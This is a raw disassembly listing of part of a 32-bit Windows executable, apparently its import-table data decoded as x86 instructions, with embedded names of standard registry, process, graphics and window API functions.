  4083db:	add    BYTE PTR [esi-0x67ffff70],cl
  4083e1:	add    DWORD PTR [eax],0x86b800
	...
  4083ef:	add    BYTE PTR [eax-0x43ffff70],bh
  4083f5:	add    DWORD PTR [eax],0x870400
	...
  408403:	add    dl,ah
  408405:	nop
  408406:	add    BYTE PTR [eax],al
  408408:	or     BYTE PTR [edx-0x78b80000],al
	...
  408416:	add    BYTE PTR [eax],al
  408418:	push   es
  408419:	xchg   ecx,eax
  40841a:	add    BYTE PTR [eax],al
  40841c:	dec    esp
  40841d:	add    BYTE PTR [eax],0x0
  408420:	sbb    al,0x87
	...
  40842a:	add    BYTE PTR [eax],al
  40842c:	sub    dl,BYTE PTR [ecx-0x7de00000]
  408432:	add    BYTE PTR [eax],al
  408434:	or     al,0x87
	...
  40843e:	add    BYTE PTR [eax],al
  408440:	dec    esp
  408441:	xchg   ecx,eax
  408442:	add    BYTE PTR [eax],al
  408444:	adc    BYTE PTR [edx-0x79540000],al
	...
  408452:	add    BYTE PTR [eax],al
  408454:	jo     0x4083e7
  408456:	add    BYTE PTR [eax],al
  408458:	mov    al,0x81
  40845a:	add    BYTE PTR [eax],al
  40845c:	rol    BYTE PTR [esi+0x0],1
  408462:	add    BYTE PTR [eax],al
  408464:	add    BYTE PTR [eax],al
  408466:	add    BYTE PTR [eax],al
  408468:	mov    ss,WORD PTR [ecx-0x7e2c0000]
  40846e:	add    BYTE PTR [eax],al
  408470:	jo     0x4083f9
	...
  40847a:	add    BYTE PTR [eax],al
  40847c:	scas   al,BYTE PTR es:[edi]
  40847d:	xchg   ecx,eax
  40847e:	add    BYTE PTR [eax],al
  408480:	je     0x408404
  408482:	add    BYTE PTR [eax],al
  408484:	sub    BYTE PTR [edi+0x0],al
  40848a:	add    BYTE PTR [eax],al
  40848c:	add    BYTE PTR [eax],al
  40848e:	add    BYTE PTR [eax],al
  408490:	(bad)  
  408491:	xchg   ecx,eax
  408492:	add    BYTE PTR [eax],al
  408494:	sub    al,0x82
  408496:	add    BYTE PTR [eax],al
  408498:	pusha  
  408499:	xchg   DWORD PTR [eax],eax
	...
  4084a3:	add    al,bh
  4084a5:	xchg   ecx,eax
  4084a6:	add    BYTE PTR [eax],al
  4084a8:	add    BYTE PTR fs:[eax],0x0
  4084ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4084ad:	xchg   BYTE PTR [eax],al
	...
  4084b7:	add    BYTE PTR [edx],ah
  4084b9:	xchg   edx,eax
  4084ba:	add    BYTE PTR [eax],al
  4084bc:	test   al,0x81
  4084be:	add    BYTE PTR [eax],al
  4084c0:	fadd   DWORD PTR [edi+0x0]
  4084c6:	add    BYTE PTR [eax],al
  4084c8:	add    BYTE PTR [eax],al
  4084ca:	add    BYTE PTR [eax],al
  4084cc:	fcom   QWORD PTR [edx-0x7d240000]
  4084d2:	add    BYTE PTR [eax],al
  4084d4:	in     al,0x87
	...
  4084de:	add    BYTE PTR [eax],al
  4084e0:	not    BYTE PTR [edx-0x7d180000]
	...
  4084fa:	add    BYTE PTR [eax],al
  4084fc:	in     al,dx
  4084fd:	xchg   DWORD PTR [eax],eax
  4084ff:	add    ah,bh
  408501:	xchg   DWORD PTR [eax],eax
  408503:	add    BYTE PTR [esi],cl
  408505:	mov    BYTE PTR [eax],al
  408507:	add    BYTE PTR [eax+ecx*4],bl
  40850a:	add    BYTE PTR [eax],al
  40850c:	sub    al,0x88
  40850e:	add    BYTE PTR [eax],al
  408510:	cmp    al,0x88
  408512:	add    BYTE PTR [eax],al
  408514:	push   eax
  408515:	mov    BYTE PTR [eax],al
  408517:	add    BYTE PTR [esi-0x78],bl
  40851a:	add    BYTE PTR [eax],al
  40851c:	outs   dx,BYTE PTR ds:[esi]
  40851d:	mov    BYTE PTR [eax],al
  40851f:	add    BYTE PTR [eax+ecx*4+0x0],al
  408526:	add    BYTE PTR [eax],al
  408528:	dec    esi
  408529:	add    DWORD PTR [eax],eax
  40852b:	or     BYTE PTR [ecx+0x1],0x0
  40852f:	or     BYTE PTR [eax+0x1],0x0
  408533:	add    BYTE PTR [eax],0x0
  408536:	add    BYTE PTR [eax],al
  408538:	add    BYTE PTR [ebx-0x76820000],dl
  40853e:	add    BYTE PTR [eax],al
  408540:	xchg   edx,eax
  408541:	mov    DWORD PTR [eax],eax
  408543:	add    BYTE PTR [eax-0x49ffff77],ah
  408549:	mov    DWORD PTR [eax],eax
  40854b:	add    dh,al
  40854d:	mov    DWORD PTR [eax],eax
  40854f:	add    ah,bl
  408551:	mov    DWORD PTR [eax],eax
  408553:	add    ah,ch
  408555:	mov    DWORD PTR [eax],eax
  408557:	add    BYTE PTR [edx],al
  408559:	mov    al,BYTE PTR [eax]
  40855b:	add    BYTE PTR [edx+ecx*4],cl
  40855e:	add    BYTE PTR [eax],al
  408560:	add    BYTE PTR [eax],al
  408562:	add    BYTE PTR [eax],al
  408564:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408565:	mov    BYTE PTR [eax],al
  408567:	add    BYTE PTR [eax-0x41ffff78],dh
  40856d:	mov    BYTE PTR [eax],al
  40856f:	add    dl,cl
  408571:	mov    BYTE PTR [eax],al
  408573:	add    ah,bl
  408575:	mov    BYTE PTR [eax],al
  408577:	add    ah,dh
  408579:	mov    BYTE PTR [eax],al
  40857b:	add    BYTE PTR [edx],al
  40857d:	mov    DWORD PTR [eax],eax
  40857f:	add    BYTE PTR [edx],bl
  408581:	mov    DWORD PTR [eax],eax
  408583:	add    BYTE PTR [edx],ch
  408585:	mov    DWORD PTR [eax],eax
  408587:	add    BYTE PTR [edx],bh
  408589:	mov    DWORD PTR [eax],eax
  40858b:	add    BYTE PTR [ecx+ecx*4+0x0],cl
  40858f:	add    BYTE PTR [edx-0x77],bl
  408592:	add    BYTE PTR [eax],al
  408594:	mov    WORD PTR [edx-0x6d880000],ss
  40859a:	add    BYTE PTR [eax],al
  40859c:	pop    esi
  40859d:	xchg   edx,eax
  40859e:	add    BYTE PTR [eax],al
  4085a0:	inc    edx
  4085a1:	xchg   edx,eax
  4085a2:	add    BYTE PTR [eax],al
  4085a4:	add    BYTE PTR [eax],al
  4085a6:	add    BYTE PTR [eax],al
  4085a8:	cmp    al,0x8c
  4085aa:	add    BYTE PTR [eax],al
  4085ac:	jne    0x4085b1
  4085ae:	add    BYTE PTR [eax-0x7fffff9c],al
  4085b4:	rol    DWORD PTR [edx],cl
  4085b6:	add    BYTE PTR [eax-0x7fffff5b],al
  4085bc:	pop    esi
  4085bd:	mov    WORD PTR [eax],es
  4085bf:	add    BYTE PTR [eax],cl
  4085c1:	xchg   esp,eax
  4085c2:	add    BYTE PTR [eax],al
  4085c4:	fwait
  4085c5:	add    BYTE PTR [eax],al
  4085c7:	add    BYTE PTR [eax],0x0
  4085ca:	add    BYTE PTR [eax],al
  4085cc:	push   0x2
  4085ce:	add    BYTE PTR [eax-0x7fffff52],al
  4085d4:	fld    DWORD PTR [eax]
  4085d6:	add    BYTE PTR [eax+0x941a],al
  4085dc:	fild   DWORD PTR [eax]
  4085de:	add    BYTE PTR [eax+0x8ca0],al
  4085e4:	xchg   edx,eax
  4085e5:	mov    WORD PTR [eax],es
  4085e7:	add    BYTE PTR [ecx+eax*1-0x737f8000],al
  4085ee:	add    BYTE PTR [eax],al
  4085f0:	int3   
  4085f1:	add    DWORD PTR [eax],eax
  4085f3:	xor    BYTE PTR [eax-0x4a800000],0x1
  4085fa:	add    BYTE PTR [eax-0x7fffff62],al
  408600:	mov    DWORD PTR [eax],0x8000
  408606:	add    BYTE PTR [eax],al
  408608:	push   esi
  408609:	mov    al,BYTE PTR [eax]
  40860b:	add    BYTE PTR [esi-0x76],bl
  40860e:	add    BYTE PTR [eax],al
  408610:	push   0xffffff8a
  408612:	add    BYTE PTR [eax],al
  408614:	jp     0x4085a0
  408616:	add    BYTE PTR [eax],al
  408618:	mov    BYTE PTR [edx-0x6c480000],cl
  40861e:	add    BYTE PTR [eax],al
  408620:	mov    ds:0x90000093,al
  408625:	xchg   ebx,eax
  408626:	add    BYTE PTR [eax],al
  408628:	jb     0x4085bd
  40862a:	add    BYTE PTR [eax],al
  40862c:	bound  edx,QWORD PTR [ebx-0x6cb00000]
  408632:	add    BYTE PTR [eax],al
  408634:	cmp    al,0x93
  408636:	add    BYTE PTR [eax],al
  408638:	xor    BYTE PTR [ebx-0x6cde0000],dl
  40863e:	add    BYTE PTR [eax],al
  408640:	push   cs
  408641:	xchg   ebx,eax
  408642:	add    BYTE PTR [eax],al
  408644:	inc    esi
  408645:	mov    al,BYTE PTR [eax]
  408647:	add    BYTE PTR [eax],bh
  408649:	mov    al,BYTE PTR [eax]
  40864b:	add    BYTE PTR [edx+ecx*4],ah
  40864e:	add    BYTE PTR [eax],al
  408650:	mov    eax,DWORD PTR es:[eax]
  408653:	add    BYTE PTR [edx],bl
  408655:	mov    eax,DWORD PTR [eax]
  408657:	add    BYTE PTR [ebx+ecx*4],cl
  40865a:	add    BYTE PTR [eax],al
  40865c:	cld    
  40865d:	mov    al,BYTE PTR [eax]
  40865f:	add    dh,ch
  408661:	mov    al,BYTE PTR [eax]
  408663:	add    dl,ah
  408665:	mov    al,BYTE PTR [eax]
  408667:	add    dl,dl
  408669:	mov    al,BYTE PTR [eax]
  40866b:	add    dl,al
  40866d:	mov    al,BYTE PTR [eax]
  40866f:	add    BYTE PTR [edx+ecx*4-0x75580000],dh
  408676:	add    BYTE PTR [eax],al
  408678:	xchg   esi,eax
  408679:	mov    al,BYTE PTR [eax]
  40867b:	add    BYTE PTR [eax],al
  40867d:	add    BYTE PTR [eax],al
  40867f:	add    ah,bh
  408681:	mov    es,WORD PTR [eax]
  408683:	add    al,al
  408685:	mov    WORD PTR [eax],es
  408687:	add    BYTE PTR [eax],bh
  408689:	mov    es,WORD PTR [eax]
  40868b:	add    al,ah
  40868d:	mov    es,WORD PTR [eax]
  40868f:	add    BYTE PTR [eax],al
  408691:	add    BYTE PTR [eax],al
  408693:	add    BYTE PTR [eax],cl
  408695:	lea    eax,[eax]
  408697:	add    ah,ch
  408699:	mov    WORD PTR [eax],es
  40869b:	add    BYTE PTR [esi-0x72],bh
  40869e:	add    BYTE PTR [eax],al
  4086a0:	add    BYTE PTR [eax],al
  4086a2:	add    BYTE PTR [eax],al
  4086a4:	fimul  WORD PTR [edi+0x0]
  4086aa:	add    BYTE PTR [eax],al
  4086ac:	dec    eax
  4086ad:	mov    es,WORD PTR [eax]
  4086af:	add    BYTE PTR [esi+ecx*4+0x0],ah
  4086b3:	add    BYTE PTR [eax],al
  4086b5:	add    BYTE PTR [eax],al
  4086b7:	add    BYTE PTR [esi],ch
  4086b9:	xchg   esp,eax
  4086ba:	add    BYTE PTR [eax],al
  4086bc:	inc    edx
  4086bd:	xchg   esp,eax
  4086be:	add    BYTE PTR [eax],al
  4086c0:	pop    eax
  4086c1:	xchg   esp,eax
  4086c2:	add    BYTE PTR [eax],al
  4086c4:	dec    esi
  4086c5:	lea    eax,[eax]
  4086c7:	add    BYTE PTR [esi],dl
  4086c9:	mov    es,WORD PTR [eax]
  4086cb:	add    BYTE PTR [eax],al
  4086cd:	add    BYTE PTR [eax],al
  4086cf:	add    BYTE PTR [esi+ecx*4-0x70460000],ah
  4086d6:	add    BYTE PTR [eax],al
  4086d8:	add    BYTE PTR [eax],al
  4086da:	add    BYTE PTR [eax],al
  4086dc:	adc    cl,BYTE PTR [edi-0x726e0000]
  4086e2:	add    BYTE PTR [eax],al
  4086e4:	cmp    cl,BYTE PTR [ebp-0x70de0000]
  4086ea:	add    BYTE PTR [eax],al
  4086ec:	fimul  DWORD PTR [eax+eax*1+0x8d2600]
  4086f3:	add    BYTE PTR [ebp+ecx*4+0x0],bh
  4086f7:	add    BYTE PTR [edi+ecx*4],dh
  4086fa:	add    BYTE PTR [eax],al
  4086fc:	mov    ah,0x8e
  4086fe:	add    BYTE PTR [eax],al
  408700:	add    BYTE PTR [eax],al
  408702:	add    BYTE PTR [eax],al
  408704:	bound  ecx,QWORD PTR [ebp+0x0]
  40870a:	add    BYTE PTR [eax],al
  40870c:	jmp    0x8f:0x9400008d
  408713:	add    BYTE PTR [esi+0x8f],ah
  408719:	add    BYTE PTR [eax],al
  40871b:	add    BYTE PTR [eax+edx*4],cl
  40871e:	add    BYTE PTR [eax],al
  408720:	ror    BYTE PTR [ebp+0x0],cl
  408726:	add    BYTE PTR [eax],al
  408728:	jle    0x4086b9
  40872a:	add    BYTE PTR [eax],al
  40872c:	jo     0x4086bd
  40872e:	add    BYTE PTR [eax],al
  408730:	add    BYTE PTR [eax],al
  408732:	add    BYTE PTR [eax],al
  408734:	or     cl,BYTE PTR [esi-0x713c0000]
  40873a:	add    BYTE PTR [eax],al
  40873c:	cli    
  40873d:	lea    eax,[eax]
  40873f:	add    dl,dl
  408741:	mov    WORD PTR [eax],es
  408743:	add    BYTE PTR [eax],al
  408745:	add    BYTE PTR [eax],al
  408747:	add    BYTE PTR [esi+0x5800008e],cl
  40874d:	pop    DWORD PTR [eax]
  40874f:	add    dl,al
  408751:	lea    eax,[eax]
  408753:	add    BYTE PTR [eax+0x2800008d],ch
  408759:	mov    es,WORD PTR [eax]
  40875b:	add    BYTE PTR [eax],al
  40875d:	add    BYTE PTR [eax],al
  40875f:	add    dh,bh
  408761:	pop    DWORD PTR [eax]
  408763:	add    ah,ch
  408765:	pop    DWORD PTR [eax]
  408767:	add    al,dl
  408769:	pop    DWORD PTR [eax]
  40876b:	add    BYTE PTR [eax],al
  40876d:	add    BYTE PTR [eax],al
  40876f:	add    BYTE PTR [eax-0x71],cl
  408772:	add    BYTE PTR [eax],al
  408774:	add    BYTE PTR [eax],al
  408776:	add    BYTE PTR [eax],al
  408778:	ficom  WORD PTR [ebx-0x6c3a0000]
  40877e:	add    BYTE PTR [eax],al
  408780:	jmp    0x93:0xf2000093
  408787:	add    al,dl
  408789:	xchg   ebx,eax
  40878a:	add    BYTE PTR [eax],al
  40878c:	test   BYTE PTR [eax+eax*1+0x947800],dl
  408793:	add    BYTE PTR [esp+ecx*4],dl
  408796:	add    BYTE PTR [eax],al
  408798:	push   es
  408799:	mov    WORD PTR [eax],es
  40879b:	add    dh,ah
  40879d:	mov    eax,DWORD PTR [eax]
  40879f:	add    ah,bl
  4087a1:	mov    eax,DWORD PTR [eax]
  4087a3:	add    al,dl
  4087a5:	mov    eax,DWORD PTR [eax]
  4087a7:	add    BYTE PTR [ebx+ecx*4-0x74520000],bh
  4087ae:	add    BYTE PTR [eax],al
  4087b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4087b1:	mov    eax,DWORD PTR [eax]
  4087b3:	add    BYTE PTR [ebx+ecx*4-0x746c0000],bl
  4087ba:	add    BYTE PTR [eax],al
  4087bc:	or     BYTE PTR [ebx-0x74900000],0x0
  4087c3:	add    BYTE PTR [edx-0x75],ah
  4087c6:	add    BYTE PTR [eax],al
  4087c8:	push   edx
  4087c9:	mov    eax,DWORD PTR [eax]
  4087cb:	add    BYTE PTR [ebx+ecx*4+0x0],al
  4087cf:	add    BYTE PTR [esi-0x6c],ch
  4087d2:	add    BYTE PTR [eax],al
  4087d4:	add    BYTE PTR [eax],al
  4087d6:	add    BYTE PTR [eax],al
  4087d8:	test   al,0x92
  4087da:	add    BYTE PTR [eax],al
  4087dc:	les    edx,FWORD PTR [edx+0x0]
  4087e2:	add    BYTE PTR [eax],al
  4087e4:	out    0x92,al
  4087e6:	add    BYTE PTR [eax],al
  4087e8:	add    BYTE PTR [eax],al
  4087ea:	add    BYTE PTR [eax],al
  4087ec:	xchg   BYTE PTR [edx],al
  4087ee:	push   edx
  4087ef:	gs addr16 dec edi
  4087f2:	jo     0x408859
  4087f4:	outs   dx,BYTE PTR ds:[esi]
  4087f5:	dec    ebx
  4087f6:	gs jns 0x40883e
  4087f9:	js     0x408852
  4087fb:	add    BYTE PTR [ebp+0x2],ch
  4087fe:	push   edx
  4087ff:	gs addr16 inc esp
  408802:	gs ins BYTE PTR es:[edi],dx
  408804:	gs je  0x40886c
  408807:	push   esi
  408808:	popa   
  408809:	ins    BYTE PTR es:[edi],dx
  40880a:	jne    0x408871
  40880c:	push   edi
  40880d:	add    BYTE PTR [ebp+0x2],dl
  408810:	push   edx
  408811:	gs addr16 inc ebx
  408814:	ins    BYTE PTR es:[edi],dx
  408815:	outs   dx,DWORD PTR ds:[esi]
  408816:	jae    0x40887d
  408818:	dec    ebx
  408819:	gs jns 0x40881c
  40881c:	ja     0x408820
  40881e:	push   edx
  40881f:	gs addr16 inc ebp
  408822:	outs   dx,BYTE PTR ds:[esi]
  408823:	jne    0x408892
  408825:	push   esi
  408826:	popa   
  408827:	ins    BYTE PTR es:[edi],dx
  408828:	jne    0x40888f
  40882a:	push   edi
  40882b:	add    BYTE PTR [ecx+0x2],ch
  40882e:	push   edx
  40882f:	gs addr16 inc esp
  408832:	gs ins BYTE PTR es:[edi],dx
  408834:	gs je  0x40889c
  408837:	dec    ebx
  408838:	gs jns 0x408892
  40883b:	add    BYTE PTR [ebx+0x67655202],dl
  408841:	push   ecx
  408842:	jne    0x4088a9
  408844:	jb     0x4088bf
  408846:	push   esi
  408847:	popa   
  408848:	ins    BYTE PTR es:[edi],dx
  408849:	jne    0x4088b0
  40884b:	inc    ebp
  40884c:	js     0x4088a5
  40884e:	add    BYTE PTR [eax],al
  408850:	and    eax,DWORD PTR [ecx]
  408852:	inc    ebp
  408853:	jbe    0x4088ba
  408855:	outs   dx,BYTE PTR ds:[esi]
  408856:	je     0x4088af
  408858:	jb     0x4088c3
  40885a:	je     0x4088c1
  40885c:	add    BYTE PTR [eax],al
  40885e:	and    BYTE PTR [ecx],al
  408860:	inc    ebp
  408861:	jbe    0x4088c8
  408863:	outs   dx,BYTE PTR ds:[esi]
  408864:	je     0x4088b8
  408866:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x21007265
  40886f:	add    DWORD PTR [ebp+0x76],eax
  408872:	outs   dx,BYTE PTR gs:[esi]
  408874:	je     0x4088c9
  408876:	gs je  0x4088c2
  408879:	outs   dx,BYTE PTR ds:[esi]
  40887a:	outs   dx,WORD PTR ds:[esi]
  40887c:	jb     0x4088eb
  40887e:	popa   
  40887f:	je     0x4088ea
  408881:	outs   dx,DWORD PTR ds:[esi]
  408882:	outs   dx,BYTE PTR ds:[esi]
  408883:	add    BYTE PTR [edx],ah
  408885:	add    DWORD PTR [ebp+0x76],eax
  408888:	outs   dx,BYTE PTR gs:[esi]
  40888a:	je     0x4088e1
  40888c:	outs   dx,BYTE PTR ds:[esi]
  40888d:	jb     0x4088f4
  40888f:	imul   esi,DWORD PTR [bp+di+0x74],0x41007265
  408897:	inc    esp
  408898:	push   esi
  408899:	inc    ecx
  40889a:	push   eax
  40889b:	dec    ecx
  40889c:	xor    esi,DWORD PTR [edx]
  40889e:	cs fs ins BYTE PTR es:[edi],dx
  4088a1:	ins    BYTE PTR es:[edi],dx
  4088a2:	add    BYTE PTR [eax],al
  4088a4:	sbb    eax,DWORD PTR [esi]
  4088a6:	ins    BYTE PTR es:[edi],dx
  4088a7:	jae    0x40891d
  4088a9:	jb     0x408917
  4088ab:	outs   dx,BYTE PTR gs:[esi]
  4088ad:	push   edi
  4088ae:	add    BYTE PTR [eax],al
  4088b0:	mov    dl,0x3
  4088b2:	dec    esp
  4088b3:	outs   dx,DWORD PTR ds:[esi]
  4088b4:	arpl   WORD PTR [ecx+0x6c],sp
  4088b7:	inc    ecx
  4088b8:	ins    BYTE PTR es:[edi],dx
  4088b9:	ins    BYTE PTR es:[edi],dx
  4088ba:	outs   dx,DWORD PTR ds:[esi]
  4088bb:	arpl   WORD PTR [eax],ax
  4088bd:	add    BYTE PTR [esi+0x636f4c03],dh
  4088c3:	popa   
  4088c4:	ins    BYTE PTR es:[edi],dx
  4088c5:	inc    esi
  4088c6:	jb     0x40892d
  4088c8:	gs add dl,bl
  4088cb:	add    BYTE PTR [ebx+0x72],al
  4088ce:	gs popa 
  4088d0:	je     0x408937
  4088d2:	push   eax
  4088d3:	jb     0x408944
  4088d5:	arpl   WORD PTR [ebp+0x73],sp
  4088d8:	jae    0x408931
  4088da:	add    BYTE PTR [eax],al
  4088dc:	mov    edx,0x69615705
  4088e1:	je     0x408929
  4088e3:	outs   dx,DWORD PTR ds:[esi]
  4088e4:	jb     0x408939
  4088e6:	imul   ebp,DWORD PTR [esi+0x67],0x624f656c
  4088ed:	push   0x65
  4088ef:	arpl   WORD PTR [ebp+eax*2+0x78],si
  4088f3:	add    BYTE PTR [ebp+0x0],bh
  4088f6:	inc    ebx
  4088f7:	ins    BYTE PTR es:[edi],dx
  4088f8:	outs   dx,DWORD PTR ds:[esi]
  4088f9:	jae    0x408960
  4088fb:	dec    eax
  4088fc:	popa   
  4088fd:	outs   dx,BYTE PTR ds:[esi]
  4088fe:	fs ins BYTE PTR es:[edi],dx
  408900:	add    BYTE PTR gs:[ebp+0x74654702],dl
  408907:	push   eax
  408908:	jb     0x408973
  40890a:	jbe    0x40896d
  40890c:	je     0x408973
  40890e:	push   eax
  40890f:	jb     0x408980
  408911:	imul   bp,WORD PTR [ebp+eiz*2+0x49],0x746e
  408918:	push   edi
  408919:	add    bh,ah
  40891b:	add    BYTE PTR [ebx+0x72],al
  40891e:	gs popa 
  408920:	je     0x408987
  408922:	push   esp
  408923:	push   0x64616572
  408928:	add    BYTE PTR [eax],al
  40892a:	lods   al,BYTE PTR ds:[esi]
  40892b:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  40892f:	fs dec esp
  408931:	imul   esp,DWORD PTR [edx+0x72],0x57797261
  408938:	add    BYTE PTR [eax],al
  40893a:	sahf   
  40893b:	add    al,BYTE PTR [edi+0x65]
  40893e:	je     0x408990
  408940:	jb     0x4089b1
  408942:	arpl   WORD PTR [ecx+0x64],ax
  408945:	fs jb  0x4089ad
  408948:	jae    0x4089bd
  40894a:	add    BYTE PTR [eax],al
  40894c:	push   ecx
  40894d:	add    DWORD PTR [ebp+0x78],eax
  408950:	imul   esi,DWORD PTR [eax+edx*2+0x72],0x7365636f
  408958:	jae    0x40895a
  40895a:	cmp    eax,DWORD PTR [ebx]
  40895c:	dec    eax
  40895d:	gs popa 
  40895f:	jo     0x4089b4
  408961:	gs je  0x4089ad
  408964:	outs   dx,BYTE PTR ds:[esi]
  408965:	outs   dx,WORD PTR ds:[esi]
  408967:	jb     0x4089d6
  408969:	popa   
  40896a:	je     0x4089d5
  40896c:	outs   dx,DWORD PTR ds:[esi]
  40896d:	outs   dx,BYTE PTR ds:[esi]
  40896e:	add    BYTE PTR [eax],al
  408970:	dec    ebx
  408971:	inc    ebp
  408972:	push   edx
  408973:	dec    esi
  408974:	inc    ebp
  408975:	dec    esp
  408976:	xor    esi,DWORD PTR [edx]
  408978:	cs fs ins BYTE PTR es:[edi],dx
  40897b:	ins    BYTE PTR es:[edi],dx
  40897c:	add    BYTE PTR [eax],al
  40897e:	push   esi
  40897f:	add    BYTE PTR [ebx+0x72],al
  408982:	gs popa 
  408984:	je     0x4089eb
  408986:	push   ebx
  408987:	outs   dx,DWORD PTR ds:[esi]
  408988:	ins    BYTE PTR es:[edi],dx
  408989:	imul   esp,DWORD PTR [edx+eax*2+0x72],0x687375
  408991:	add    BYTE PTR [ecx+0x2],bl
  408994:	inc    edi
  408995:	gs je  0x4089e7
  408998:	bound  ebp,QWORD PTR [edx+0x65]
  40899b:	arpl   WORD PTR [edi+edx*2+0x0],si
  40899f:	add    BYTE PTR [ecx+0x0],al
  4089a2:	inc    ebx
  4089a3:	jb     0x408a0a
  4089a5:	popa   
  4089a6:	je     0x408a0d
  4089a8:	inc    esi
  4089a9:	outs   dx,DWORD PTR ds:[esi]
  4089aa:	outs   dx,BYTE PTR ds:[esi]
  4089ab:	je     0x4089f6
  4089ad:	outs   dx,BYTE PTR ds:[esi]
  4089ae:	imul   esi,DWORD PTR fs:[edx+0x65],0x577463
  4089b6:	add    eax,0x6c655303
  4089bb:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  4089c0:	push   0x65
  4089c2:	arpl   WORD PTR [eax+eax*1+0x0],si
  4089c6:	jge    0x4089ca
  4089c8:	inc    edi
  4089c9:	gs je  0x408a20
  4089cc:	gs js  0x408a43
  4089cf:	inc    ebp
  4089d0:	js     0x408a46
  4089d2:	outs   dx,BYTE PTR gs:[esi]
  4089d4:	je     0x408a26
  4089d6:	outs   dx,DWORD PTR ds:[esi]
  4089d7:	imul   ebp,DWORD PTR [esi+0x74],0x13e0057
  4089de:	inc    esp
  4089df:	gs ins BYTE PTR es:[edi],dx
  4089e1:	gs je  0x408a49
  4089e4:	dec    edi
  4089e5:	bound  ebp,QWORD PTR [edx+0x65]
  4089e8:	arpl   WORD PTR [eax+eax*1+0x0],si
  4089ec:	xor    DWORD PTR [eax],eax
  4089ee:	inc    ebx
  4089ef:	jb     0x408a56
  4089f1:	popa   
  4089f2:	je     0x408a59
  4089f4:	inc    ebx
  4089f5:	outs   dx,DWORD PTR ds:[esi]
  4089f6:	ins    DWORD PTR es:[edi],dx
  4089f7:	jo     0x408a5a
  4089f9:	je     0x408a64
  4089fb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x44]
  4089ff:	inc    ebx
  408a00:	add    BYTE PTR [eax],al
  408a02:	adc    eax,DWORD PTR [eax]
  408a04:	inc    edx
  408a05:	imul   esi,DWORD PTR [edx+eax*2+0x6c],0xc000074
  408a0d:	add    edx,DWORD PTR [ebx+0x65]
  408a10:	je     0x408a54
  408a12:	imul   eax,DWORD PTR [ebx+0x6f],0x6c
  408a16:	outs   dx,DWORD PTR ds:[esi]
  408a17:	jb     0x408a19
  408a19:	add    BYTE PTR [edi+0x44],al
  408a1c:	dec    ecx
  408a1d:	xor    esi,DWORD PTR [edx]
  408a1f:	cs fs ins BYTE PTR es:[edi],dx
  408a22:	ins    BYTE PTR es:[edi],dx
  408a23:	add    BYTE PTR [esi+0x74654701],ch
  408a29:	push   ebx
  408a2a:	jns    0x408a9f
  408a2c:	je     0x408a93
  408a2e:	ins    DWORD PTR es:[edi],dx
  408a2f:	dec    ebp
  408a30:	gs je  0x408aa5
  408a33:	imul   esp,DWORD PTR [ebx+0x73],0x1ab0000
  408a3a:	inc    edi
  408a3b:	gs je  0x408a91
  408a3e:	jns    0x408ab3
  408a40:	inc    ebx
  408a41:	outs   dx,DWORD PTR ds:[esi]
  408a42:	ins    BYTE PTR es:[edi],dx
  408a43:	outs   dx,DWORD PTR ds:[esi]
  408a44:	jb     0x408a46
  408a46:	fiadd  WORD PTR [edx]
  408a48:	push   ebx
  408a49:	outs   dx,BYTE PTR gs:[esi]
  408a4b:	fs dec ebp
  408a4d:	gs jae 0x408ac3
  408a50:	popa   
  408a51:	addr16 gs push edi
  408a54:	add    BYTE PTR [eax],al
  408a56:	add    DWORD PTR ss:[edi+0x65],eax
  408a5a:	je     0x408aa0
  408a5c:	inc    ebx
  408a5d:	add    dh,al
  408a5f:	add    dl,BYTE PTR [edx+0x65]
  408a62:	ins    BYTE PTR es:[edi],dx
  408a63:	gs popa 
  408a65:	jae    0x408acc
  408a67:	inc    esp
  408a68:	inc    ebx
  408a69:	add    al,dl
  408a6b:	add    DWORD PTR [edi+0x65],eax
  408a6e:	je     0x408ac7
  408a70:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  408a77:	arpl   WORD PTR [eax+eax*1+0x54],si
  408a7b:	add    cl,BYTE PTR [ebp+0x65]
  408a7e:	jae    0x408af3
  408a80:	popa   
  408a81:	addr16 gs inc edx
  408a84:	gs gs jo 0x408a88
  408a88:	aas    
  408a89:	add    cl,BYTE PTR [edi+ebp*2+0x61]
  408a8d:	fs push ebx
  408a8f:	je     0x408b03
  408a91:	imul   ebp,DWORD PTR [esi+0x67],0x1d70057
  408a98:	inc    edi
  408a99:	gs je  0x408af3
  408a9c:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  408aa3:	js     0x408b19
  408aa5:	push   edi
  408aa6:	add    BYTE PTR [eax],al
  408aa8:	jge    0x408aab
  408aaa:	inc    edi
  408aab:	gs je  0x408afe
  408aae:	popa   
  408aaf:	jb     0x408b16
  408ab1:	outs   dx,BYTE PTR ds:[esi]
  408ab2:	je     0x408ab4
  408ab4:	pop    esp
  408ab5:	add    cl,BYTE PTR [ebp+0x65]
  408ab8:	jae    0x408b2d
  408aba:	popa   
  408abb:	addr16 gs inc edx
  408abe:	outs   dx,DWORD PTR ds:[esi]
  408abf:	js     0x408b18
  408ac1:	add    BYTE PTR [esi],al
  408ac3:	add    DWORD PTR [ebp+0x78],eax
  408ac6:	imul   esi,DWORD PTR [edi+edx*2+0x69],0x776f646e
  408ace:	jae    0x408b15
  408ad0:	js     0x408ad2
  408ad2:	jg     0x408ad6
  408ad4:	push   eax
  408ad5:	outs   dx,DWORD PTR ds:[esi]
  408ad6:	jae    0x408b4c
  408ad8:	dec    ebp
  408ad9:	gs jae 0x408b4f
  408adc:	popa   
  408add:	addr16 gs push edi
  408ae0:	add    BYTE PTR [eax],al
  408ae2:	xlat   BYTE PTR ds:[ebx]
  408ae3:	add    BYTE PTR [edx+esi*2+0x61],al
  408ae7:	ja     0x408b3d
  408ae9:	gs js  0x408b60
  408aec:	push   edi
  408aed:	add    BYTE PTR [edx+eax*1],ch
  408af0:	dec    esp
  408af1:	outs   dx,DWORD PTR ds:[esi]
  408af2:	popa   
  408af3:	fs inc edx
  408af5:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x33005770
  408afd:	add    edx,DWORD PTR [ebx+0x65]
  408b00:	je     0x408b59
  408b02:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  408b09:	jae    0x408b0b
